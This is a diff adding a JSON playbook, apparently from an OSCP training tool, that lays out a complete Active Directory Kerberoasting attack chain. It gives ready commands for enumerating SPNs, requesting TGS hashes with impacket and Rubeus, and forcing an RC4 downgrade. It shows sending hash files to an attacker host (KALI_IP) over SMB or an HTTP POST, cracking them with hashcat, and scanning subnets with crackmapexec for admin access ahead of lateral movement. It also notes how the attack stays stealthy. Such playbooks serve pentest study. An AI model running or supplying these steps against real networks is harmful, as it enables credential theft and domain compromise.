@@ -1,0 +1,279 @@
+{
+  "id": "ad-attack-kerberoasting-full",
+  "name": "Active Directory Kerberoasting Full Attack Chain",
+  "description": "Complete Kerberoasting attack chain from SPN enumeration to credential validation.\n\nIdentifies service accounts with registered SPNs, requests TGS tickets, extracts offline-crackable TGS-REP hashes, cracks service account passwords with Hashcat, validates credentials, and checks for lateral movement opportunities.",
+  "version": "1.0.0",
+  "metadata": {
+    "author": "CRACK Development Team - OSCP Track",
+    "created": "2025-11-10",
+    "updated": "2025-11-10",
+    "tags": [
+      "OSCP:HIGH",
+      "ACTIVE_DIRECTORY",
+      "KERBEROASTING",
+      "KERBEROS",
+      "SPN",
+      "CREDENTIAL_ACCESS",
+      "OFFLINE_CRACKING",
+      "SERVICE_ACCOUNTS",
+      "PRIVILEGE_ESCALATION"
+    ],
+    "category": "credential-access",
+    "platform": "active-directory",
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py",
+      "https://github.com/GhostPack/Rubeus",
+      "https://attack.mitre.org/techniques/T1558/003/",
+      "https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/"
+    ]
+  },
+  "difficulty": "beginner",
+  "time_estimate": "120 minutes",
+  "oscp_relevant": true,
+  "prerequisites": [
+    "Valid domain user credentials (ANY domain user can perform Kerberoasting - no special privileges required)",
+    "Network access to domain controller (Linux: impacket-GetUserSPNs) OR RDP/WinRM access to domain-joined Windows system (Rubeus)",
+    "Hashcat installed for offline hash cracking (GPU recommended for faster cracking)"
+  ],
+  "notes": "OSCP HIGH-PRIORITY: Kerberoasting is one of the most successful AD attacks. SUCCESS RATE: High in corporate environments (60-80% of domains have service accounts with weak passwords). WHY IT WORKS: ANY authenticated domain user can request TGS for ANY SPN - no permission checks at TGS request time. The TGS is encrypted with service account password hash, allowing offline cracking. TARGET ACCOUNTS: Service accounts with SPNs (SQL Server, IIS, custom services). CRITICAL: Computer accounts (MACHINE$) and Managed Service Accounts (MSAs) have 120-character random passwords - UNCRACKABLE. Focus on USER accounts with SPNs (sql_service, iis_service, svc_backup, etc.). ENCRYPTION TYPES: Modern domains use AES (slower to crack). Use Rubeus /tgtdeleg flag to downgrade to RC4 (10x faster cracking). TIME ESTIMATE: SPN enum (10 sec) + TGS request (10 sec) + cracking (1 min - 2 hours depending on password strength and wordlist). NO LOCKOUT RISK: Requesting TGS doesn't trigger account lockout. STEALTH: Event ID 4769 (TGS request) - normal Kerberos traffic, difficult to distinguish from legitimate service access. COMPLEMENTARY TO AS-REP ROASTING: Different attack surface - Kerberoasting targets service accounts, AS-REP targets misconfigured user accounts.",
+  "steps": [
+    {
+      "id": "authenticate-to-domain",
+      "name": "Authenticate to Domain with Valid Credentials",
+      "objective": "Establish authenticated session to Active Directory (required for SPN enumeration and TGS requests)",
+      "description": "REQUIREMENT: Valid domain user credentials.\nANY domain user can perform Kerberoasting - even Guest account (if enabled) or low-privilege user (standard user, no admin rights).\n\nAUTHENTICATION IS MANDATORY: Unlike AS-REP roasting (which can work unauthenticated), Kerberoasting REQUIRES authentication to query SPNs and request TGS tickets.\n\nLINUX: Credentials provided via command line: impacket-GetUserSPNs <DOMAIN>/<USERNAME>.\nPassword prompted interactively OR provided with -hashes flag (NTLM hash) OR -k flag (Kerberos ticket).\n\nWINDOWS: Use current user session OR runas /netonly /user:<DOMAIN>\\<USERNAME> cmd.exe to inject credentials.\nRubeus automatically uses current session context.\n\nVERIFICATION: Linux → impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME> (should list SPNs if credentials valid).\nWindows → whoami /groups (should show domain groups).\n\nTIME SYNC: Ensure system time synchronized with DC (ntpdate <DC_IP>) to avoid KRB_AP_ERR_SKEW errors.",
+      "command_ref": "concept-authentication",
+      "evidence": [
+        "Valid domain credentials confirmed",
+        "Authentication successful (no access denied errors)",
+        "Domain context established (Linux: credentials accepted, Windows: domain groups visible)"
+      ],
+      "dependencies": [],
+      "repeatable": false,
+      "success_criteria": [
+        "Credentials authenticate successfully",
+        "No KRB_AP_ERR_SKEW errors (time sync OK)",
+        "Domain user context established"
+      ],
+      "failure_conditions": [
+        "STATUS_LOGON_FAILURE (invalid credentials)",
+        "KRB_AP_ERR_SKEW (time sync issue - use ntpdate)",
+        "KDC_ERR_C_PRINCIPAL_UNKNOWN (wrong username or domain)"
+      ],
+      "next_steps": [
+        "enumerate-spns"
+      ]
+    },
+    {
+      "id": "enumerate-spns",
+      "name": "Enumerate Service Principal Names",
+      "objective": "Identify all SPNs registered to USER accounts (potential Kerberoasting targets)",
+      "description": "SPN ENUMERATION WITHOUT HASH EXTRACTION: Linux → impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME> (no -request flag = enumeration only).\nWindows → Rubeus.exe kerberoast (shows SPNs) OR setspn -Q */* (shows ALL SPNs including computer accounts).\n\nOUTPUT ANALYSIS: ServicePrincipalName (service type and hostname), Name (account name), MemberOf (group membership - prioritize privileged accounts), PasswordLastSet (old = weak password likely).\n\nFILTER TARGETS:\n(1) IGNORE computer accounts (ending in $) - 120-char random passwords, uncrackable.\n(2) IGNORE MSA/gMSA accounts (managed service accounts) - 120-char random passwords, uncrackable.\n(3) TARGET user accounts with SPNs (sql_service, iis_service, svc_*, etc.).\n\nPRIORITIZATION:\n(1) Old PasswordLastSet dates (>1 year = weak password likely).\n(2) Privileged group membership (Domain Admins, high-value).\n(3) Common service names (sql_service often has 'Password1!' or similar).\n\nTIME ESTIMATE: 5-10 seconds for enumeration.\n\nEXPECTED RESULTS: 0-10 user SPNs typical.\n0 SPNs = less common but possible (all services run as computer accounts).\n>10 = large environment or many custom services.",
+      "command_ref": "impacket-getuserspns-list",
+      "evidence": [
+        "List of SPNs registered to user accounts",
+        "SPN details: serviceprincipalname, name, memberof, pwdlastset",
+        "Computer accounts and MSAs filtered out (only user accounts targeted)"
+      ],
+      "dependencies": [
+        "authenticate-to-domain"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "SPN enumeration completed successfully",
+        "User accounts with SPNs identified",
+        "High-value targets prioritized (old passwords, admin groups)"
+      ],
+      "failure_conditions": [
+        "No entries found (no user accounts with SPNs - common, not a failure)",
+        "Access denied (authentication issue - return to step 1)",
+        "Only computer accounts found (filter these out, they're uncrackable)"
+      ],
+      "next_steps": [
+        "filter-spn-accounts"
+      ]
+    },
+    {
+      "id": "filter-spn-accounts",
+      "name": "Filter Out Computer and Managed Service Accounts",
+      "objective": "Remove uncrackable accounts (computer accounts and MSAs) from target list",
+      "description": "COMPUTER ACCOUNTS: Identified by $ at end of name (e.g., WEB01$, SQL-SERVER$).\nPASSWORD POLICY: 120 characters, random, auto-rotated every 30 days by AD.\nUNCRACKABLE with current technology (120-char keyspace = infeasible).\nFILTER OUT: Do NOT request TGS for computer accounts - wastes time and generates unnecessary traffic.\n\nMANAGED SERVICE ACCOUNTS (MSA/gMSA): Identified by msDS-ManagedServiceAccount objectClass OR msDS-GroupManagedServiceAccount.\nSame 120-char random password policy.\nUNCRACKABLE.\nFILTER OUT: Exclude from Kerberoasting targets.\n\nUSER SERVICE ACCOUNTS: Regular user accounts (not ending in $, not MSA) with servicePrincipalName attribute.\nPASSWORD POLICY: Standard domain user policy (often 7-14 chars, user-chosen password).\nCRACKABLE if weak password (Password1!, ServiceAccount123!, company name + year).\nTARGET THESE: sql_service, iis_service, svc_backup, svc_admin, etc.\n\nVERIFICATION: impacket-GetUserSPNs output 'Name' column should NOT end in $ for target accounts.\n\nOSCP TIP: If all SPNs are on computer accounts (all names end in $), Kerberoasting attack surface is zero.\nDocument and proceed to alternative attacks (AS-REP roasting, password spraying).",
+      "command_ref": "concept-filter-accounts",
+      "evidence": [
+        "Computer accounts identified and excluded (names ending in $)",
+        "MSA/gMSA accounts identified and excluded",
+        "Final target list contains only user accounts with SPNs",
+        "Target count documented (may be 0 if only computer accounts have SPNs)"
+      ],
+      "dependencies": [
+        "enumerate-spns"
+      ],
+      "repeatable": false,
+      "success_criteria": [
+        "Computer accounts successfully filtered out",
+        "MSA/gMSA accounts successfully filtered out",
+        "Clean target list of user accounts with SPNs"
+      ],
+      "failure_conditions": [
+        "No user accounts remain after filtering (all SPNs on computer/MSA accounts)",
+        "Unable to distinguish account types (missing $ indicator or objectClass)"
+      ],
+      "next_steps": [
+        "request-tgs-hashes"
+      ]
+    },
+    {
+      "id": "request-tgs-hashes",
+      "name": "Request TGS Tickets and Extract Hashes",
+      "objective": "Request service tickets (TGS) for targeted SPNs and extract TGS-REP hashes for offline cracking",
+      "description": "LINUX: impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>.\nThe -request flag triggers TGS requests for ALL identified user SPNs.\nOutput shows TGS-REP hashes in Hashcat mode 13100 format.\nAdd -outputfile hashes.kerberoast to save to file.\n\nWINDOWS: Rubeus.exe kerberoast /outfile:C:\\hashes.kerberoast.\nAutomatically requests TGS for all user SPNs and extracts hashes.\n\nCRITICAL: Rubeus may show 'NOTICE: AES hashes will be returned for AES-enabled accounts' - this means TGS is encrypted with AES (slower to crack).\nUse /tgtdeleg flag to force RC4 downgrade: Rubeus.exe kerberoast /tgtdeleg /outfile:C:\\hashes_rc4.kerberoast.\n\nHASH FORMAT: $krb5tgs$23$ = Kerberos 5 TGS-REP etype 23 (RC4-HMAC) = Hashcat mode 13100.\n$krb5tgs$17$ or $krb5tgs$18$ = AES encryption = Hashcat mode 19600/19700 (slower).\n\nRC4 VS AES: RC4 cracking ~10x faster than AES.\nIf Rubeus shows AES, use /tgtdeleg to downgrade.\n\nTIME ESTIMATE: <10 seconds for hash extraction.\n\nEXPECTED OUTPUT: One $krb5tgs$ hash per user SPN from step 3.",
+      "command_ref": "impacket-getuserspns-kerberoast",
+      "evidence": [
+        "TGS-REP hashes extracted for all user SPNs",
+        "Hashes saved to file (hashes.kerberoast)",
+        "Hash format verified: $krb5tgs$23$ (RC4) or $krb5tgs$17$/$krb5tgs$18$ (AES)",
+        "One hash per service account identified in previous steps"
+      ],
+      "dependencies": [
+        "filter-spn-accounts"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "TGS hashes extracted successfully",
+        "Hash file created with correct format",
+        "Hash count matches SPN count from step 3"
+      ],
+      "failure_conditions": [
+        "No entries found (no user SPNs - expected if step 3 found 0 user accounts)",
+        "KRB_AP_ERR_SKEW (time sync issue)",
+        "CCache file is not found (warning only - ignore unless using Kerberos tickets)"
+      ],
+      "next_steps": [
+        "transfer-hashes",
+        "crack-tgsrep-hashes"
+      ]
+    },
+    {
+      "id": "transfer-hashes",
+      "name": "Transfer Hashes to Cracking System (If Needed)",
+      "objective": "Move TGS-REP hash files from Windows to Linux Kali system for Hashcat cracking",
+      "description": "SKIP IF: Hashes extracted on Kali with impacket-GetUserSPNs.\nProceed directly to step 6 (crack-tgsrep-hashes).\n\nREQUIRED IF: Hashes extracted on Windows with Rubeus.\nTransfer to Kali for cracking (better wordlists, GPU support).\n\nTRANSFER METHODS:\n(1) SMB SHARE: Kali → sudo impacket-smbserver share /home/kali/hashes -smb2support -username user -password pass.\nWindows → copy C:\\hashes.kerberoast \\\\KALI_IP\\share\\.\n\n(2) RDP DISK SHARE: rdesktop -r disk:share=/home/kali/hashes <WINDOWS_IP>, Windows → copy C:\\hashes.kerberoast \\\\tsclient\\share\\.\n\n(3) BASE64 ENCODE: Windows → certutil -encode C:\\hashes.kerberoast C:\\hashes.b64, copy output to Kali, base64 -d > hashes.kerberoast.\n\n(4) PYTHON HTTP: Kali → python3 -m http.server 8000, Windows → Invoke-WebRequest -Uri http://KALI_IP:8000 -Method POST -InFile C:\\hashes.kerberoast.\n\nVERIFICATION: cat hashes.kerberoast on Kali shows $krb5tgs$23$ hashes.\nwc -l hashes.kerberoast shows hash count matches Windows extraction.\n\nTIME ESTIMATE: 30-90 seconds.",
+      "command_ref": "impacket-smbserver",
+      "evidence": [
+        "Hash file transferred to Kali successfully",
+        "File integrity verified (hash count and format correct)",
+        "File readable by current user (chmod 644 if needed)"
+      ],
+      "dependencies": [
+        "request-tgs-hashes"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "Hash file present on Kali system",
+        "Hash count matches source file",
+        "Hash format intact (no corruption during transfer)"
+      ],
+      "failure_conditions": [
+        "Transfer failed (network connectivity)",
+        "File corruption (hashes invalid after transfer)",
+        "Permission denied (chmod required)"
+      ],
+      "next_steps": [
+        "crack-tgsrep-hashes"
+      ]
+    },
+    {
+      "id": "crack-tgsrep-hashes",
+      "name": "Crack TGS-REP Hashes with Hashcat Mode 13100",
+      "objective": "Recover plaintext service account passwords from TGS-REP hashes using dictionary and rule-based attacks",
+      "description": "HASHCAT MODE: 13100 (Kerberos 5, etype 23, TGS-REP).\nVERIFY: hashcat --help | grep -i 'Kerberos' shows mode 13100 for TGS-REP.\n\nATTACK STRATEGY:\n(1) STRAIGHT DICTIONARY: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force (14M passwords, try first).\n\n(2) RULE-BASED: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (adds mutations).\n\n(3) TARGETED: Service account passwords often follow patterns: ServiceName (sql → MSSQLService), ServiceName + year (iis → IIS2019!), Company name (Acme → AcmeSQL123!).\nCreate custom wordlist.\n\n(4) COMPREHENSIVE: Use rockyou-30000.rule for thorough attack (30K mutations, takes hours).\n\n--force FLAG: Required in VM without GPU.\n\nMONITORING: Press 's' for status, --status --status-timer=30 for updates.\n\nRC4 vs AES: RC4 (mode 13100) much faster.\nAES (mode 19600/19700) 10x slower.\nPrefer RC4 hashes from Rubeus /tgtdeleg.\n\nTIME ESTIMATE: Weak password (dictionary word + number) = 5-30 minutes with rules.\nMedium password (10 random chars) = hours to days.\nStrong password (12+ random) = infeasible.",
+      "command_ref": "hashcat-crack-tgsrep",
+      "evidence": [
+        "Hashcat status shows 'Cracked'",
+        "Password recovered: $krb5tgs$23$*service_account$...:Password123!",
+        "Result saved to ~/.hashcat/hashcat.potfile automatically"
+      ],
+      "dependencies": [
+        "transfer-hashes"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "At least one service account password cracked",
+        "Password documented and extracted from hash output",
+        "Result preserved in potfile for future reference"
+      ],
+      "failure_conditions": [
+        "Exhausted - password not in wordlist (try larger wordlist or more rules)",
+        "Token length exception (hash format incorrect)",
+        "Strong password (may be infeasible - document and move to alternative attacks)"
+      ],
+      "next_steps": [
+        "extract-passwords",
+        "validate-service-credentials"
+      ]
+    },
+    {
+      "id": "extract-passwords",
+      "name": "Extract and Document Cracked Passwords",
+      "objective": "Extract plaintext passwords from Hashcat output and document service account credentials",
+      "description": "HASHCAT POTFILE: All cracked passwords automatically saved to ~/.hashcat/hashcat.potfile.\n\nVIEW RESULTS: hashcat -m 13100 hashes.kerberoast --show.\nOutput format: hash:password OR username:hash:password (if --username flag used).\n\nEXTRACT PASSWORDS: hashcat -m 13100 hashes.kerberoast --show --outfile-format=2 shows passwords only (no hashes).\nBetter for documentation: --outfile-format=5 shows hash:password pairs.\n\nPARSE OUTPUT: For impacket format: grep '$krb5tgs' output shows full hash.\nExtract username from hash: $krb5tgs$23$*USERNAME$REALM$...\nExtract password after final colon.\nFor Rubeus format: output shows SamAccountName and password.\n\nDOCUMENTATION: Create credentials file: echo 'iis_service:Strawberry1' >> service_creds.txt.\nDocument:\n(1) Service account name.\n(2) Plaintext password.\n(3) Associated SPN (HTTP/web04.corp.com).\n(4) Group membership (from step 2 enumeration).\n\nTIME ESTIMATE: <30 seconds to extract and document.",
+      "command_ref": "hashcat-show-cracked",
+      "evidence": [
+        "Plaintext passwords extracted from potfile",
+        "Service account credentials documented (username:password format)",
+        "SPN and group membership information included for context",
+        "Credentials ready for validation step"
+      ],
+      "dependencies": [
+        "crack-tgsrep-hashes"
+      ],
+      "repeatable": false,
+      "success_criteria": [
+        "All cracked passwords extracted successfully",
+        "Credentials documented in clear format",
+        "Associated metadata (SPN, groups) documented"
+      ],
+      "failure_conditions": [
+        "Unable to parse potfile (corruption)",
+        "Password extraction failed (format issue)"
+      ],
+      "next_steps": [
+        "validate-service-credentials"
+      ]
+    },
+    {
+      "id": "validate-service-credentials",
+      "name": "Validate Service Account Credentials and Check Privileges",
+      "objective": "Confirm cracked service account passwords are valid and identify privilege level and lateral movement opportunities",
+      "description": "CREDENTIAL VALIDATION: Use crackmapexec to test credentials.\n\nSINGLE TARGET: crackmapexec smb <DC_IP> -u iis_service -p 'Strawberry1' -d corp.com.\nOutput: [+] corp.com\\iis_service:Strawberry1 confirms valid.\n\nSUBNET SCAN: crackmapexec smb 192.168.50.0/24 -u iis_service -p 'Strawberry1' -d corp.com scans /24 subnet for admin rights.\n(Pwn3d!) indicator = local admin on that system.\n\nSERVICE ACCOUNT PRIVILEGES: Service accounts are often OVER-PRIVILEGED:\n(1) Local admin on multiple servers (database servers, web servers).\n(2) Domain admin membership (poor security practice but common).\n(3) High-privilege groups (Backup Operators, Server Operators).\n(4) Excessive permissions (GenericAll, WriteDACL on domain objects).\n\nPRIVILEGE CHECK: net user iis_service /domain (shows group membership).\nGet-DomainUser iis_service -Properties memberof (PowerView).\n\nLATERAL MOVEMENT: If (Pwn3d!) found → use psexec, evil-winrm, wmiexec for SYSTEM shell.\nIf Domain Admin → full domain compromise immediately.\nIf standard service account → enumerate further for privilege escalation paths.\n\nTIME ESTIMATE: Validation (5 sec), subnet scan (2-4 min), privilege analysis (30 sec).",
+      "command_ref": "crackmapexec-validate-admin",
+      "evidence": [
+        "Service account credentials validated successfully",
+        "Group membership and privileges documented",
+        "Systems with local admin rights identified (Pwn3d! indicator)",
+        "Lateral movement opportunities assessed"
+      ],
+      "dependencies": [
+        "extract-passwords"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "Credentials confirmed valid and active",
+        "Privilege level determined (standard user vs admin vs domain admin)",
+        "Lateral movement targets identified",
+        "Attack path to domain compromise established"
+      ],
+      "failure_conditions": [
+        "STATUS_LOGON_FAILURE (password changed since crack)",
+        "STATUS_ACCOUNT_DISABLED (account disabled by admin)",
+        "No (Pwn3d!) systems and no privileged groups (limited value - still useful for AD enumeration)"
+      ],
+      "next_steps": [
+        "psexec-shell",
+        "wmiexec-shell",
+        "smbexec-shell",
+        "evil-winrm-shell"
+      ]
+    }
+  ]
+}
